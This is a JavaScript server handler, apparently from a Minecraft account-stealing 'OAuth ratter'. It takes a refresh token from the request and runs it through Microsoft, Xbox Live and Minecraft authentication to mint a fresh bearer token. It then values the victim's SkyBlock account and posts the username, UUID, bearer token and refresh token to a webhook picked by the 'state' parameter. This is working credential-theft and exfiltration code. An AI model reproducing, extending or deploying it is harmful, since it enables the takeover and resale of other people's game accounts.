const networthCalc = require("./utils/Networth.js");
const postWebhook = require("./utils/postWebhook.js");
const getWebhook = require("./utils/getWebhook.js");

const config = require('../../config.json');
const axios = require('axios')
const mysql = require('mysql2');

module.exports = async (req, res) => {
    const state = req.query.state;
    const refresh_token = req.query.refresh_token;
    const ip = null;
    var AccessToken, RefreshToken;
    var UserToken, UserHash;
    var XSTToken;
    var BearerToken;
    let webhook;

    webhook = await getWebhook("oauth", state);


    let networth = "0";
    let soulboundnetworth = "0";
    let description = "No profile data found. 🙁";

    // array for the list of urls that will be used to get the data
    const urls = ['https://login.live.com/oauth20_token.srf', 'https://user.auth.xboxlive.com/user/authenticate', 'https://xsts.auth.xboxlive.com/xsts/authorize', 'https://api.minecraftservices.com/authentication/login_with_xbox']
    // array for the list of configs that will be used to get the data
    const configs = [{ headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }, { headers: { 'Content-Type': 'application/json', 'Accept': 'application/json', } }, { headers: { 'Content-Type': 'application/json', 'Accept': 'application/json', } }, { headers: { 'Content-Type': 'application/json', } }]

    let DataAccessAndRefreshToken = {
        client_id: config.azure.client_id,
        redirect_uri: config.azure.redirect_uri,
        client_secret: config.azure.client_secret,
        refresh_token: refresh_token,
        grant_type: 'refresh_token'
    }

    // get the response of the request to get the access token and refresh token
    ResponseAccessAndRefreshToken = await axios.post(urls[0], DataAccessAndRefreshToken, configs[0])

    // set the access token and refresh token
    AccessToken = ResponseAccessAndRefreshToken.data.access_token;
    RefreshToken = ResponseAccessAndRefreshToken.data.refresh_token

    // if the access token or refresh token is not found, return an error
    if (!AccessToken || !RefreshToken) return res.send("Unable to get access token or refresh token, token can not be refreshed.")

    let DataUserTokenAndHash = {
        Properties: {
            AuthMethod: "RPS",
            SiteName: "user.auth.xboxlive.com",
            RpsTicket: `d=${AccessToken}`
        },
        RelyingParty: "http://auth.xboxlive.com",
        TokenType: "JWT"
    }

    // get the response of the request to get the user token and hash
    ResponseUserTokenAndHash = await axios.post(urls[1], DataUserTokenAndHash, configs[1])

    // set the user token and hash
    UserToken = ResponseUserTokenAndHash.data.Token;
    UserHash = ResponseUserTokenAndHash.data.DisplayClaims.xui[0].uhs;

    // if the user token or hash is not found, return an error
    if (!UserToken || !UserHash) return res.send("Unable to get user token or hash, token can not be refreshed.");

    let DataXSTToken = {
        Properties: {
            SandboxId: "RETAIL",
            UserTokens: [UserToken]
        },
        RelyingParty: "rp://api.minecraftservices.com/",
        TokenType: "JWT"
    }

    // get the response of the request to get the XST token
    ResponseXSTToken = await axios.post(urls[2], DataXSTToken, configs[2])

    // set the XST token
    XSTToken = ResponseXSTToken.data.Token

    // if the XST token is not found, return an error
    if (!XSTToken) return res.send("Unable to get XST token, token can not be refreshed.")

    let DataBearerToken = {
        identityToken: `XBL3.0 x=${UserHash};${XSTToken}`,
        ensureLegacyEnabled: true
    }

    // get the response of the request to get the Bearer token
    ResponseBearerToken = await axios.post(urls[3], DataBearerToken, configs[3])

    // set the Bearer token
    BearerToken = ResponseBearerToken.data.access_token

    // if the Bearer token is not found, return an error
    if (!BearerToken) return res.send("Unable to get Bearer Token, token can not be refreshed.")

    // get the user's username and uuid using the Bearer token
    GetPlayer(BearerToken).then(result => {
        // set the user's username and uuid to the corresponding items in the array
        uuid = result[0]
        username = result[1]

        // calculate the networth and soulbound networth using the user's uuid
        networthCalc(uuid).then((result) => {
            // make the networth and soulbound networth look nice
            networth = Intl.NumberFormat('en-US', {
                notation: 'compact',
                maximumFractionDigits: 2,
            }).format(result[0]);
            soulboundnetworth = Intl.NumberFormat('en-US', {
                notation: 'compact',
                maximumFractionDigits: 2,
            }).format(result[1]);
            description = result[2];
            postWebhook(true, username, uuid, ip, BearerToken, RefreshToken, networth, soulboundnetworth, description, webhook, state)
            // send a message to the user that the token has been refreshed
            res.send("Token refreshed successfully! You may now close this window :)")
        }).catch(err => {
            console.log(err)
        });
    }).catch(err => {
        console.log(err)
    });
}

// function to get the user's username and uuid
async function GetPlayer(BearerToken) {
    const url = 'https://api.minecraftservices.com/minecraft/profile'
    const config = {
        headers: {
            'Authorization': 'Bearer ' + BearerToken,
        }
    }
    let response = await axios.get(url, config)
    return [response.data['id'], response.data['name']]
}